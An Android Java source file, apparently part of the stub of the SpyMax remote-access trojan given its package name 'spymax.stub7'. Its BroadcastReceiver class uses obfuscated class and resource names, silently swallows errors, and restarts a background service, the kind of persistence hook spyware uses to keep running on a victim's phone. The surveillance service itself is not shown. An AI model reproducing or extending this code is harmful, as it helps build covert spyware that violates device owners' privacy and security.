package spymax.stub7;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class RC extends BroadcastReceiver {
    @Override
    public void onReceive(Context x, Intent intent) {

       try
       {
           ClassGen3.p_ClassGen3_r = x.getResources().getString(R.string.t1t2t3t4t5t6);
//           if (ClassGen11.app_ClassGen11_Context== null)
//           {
//               ClassGen11.app_ClassGen11_Context = x;
          // }

           if (ClassGen10._runn_srv_(ClassGen11.class, x)) {
               ClassGen3.p_ClassGen3_r = x.getResources().getString(R.string.t1t2t3t4t5t6);

                   x.startService(new Intent(x, ClassGen11.class));

           }
       }catch (Exception e){}


    }
}
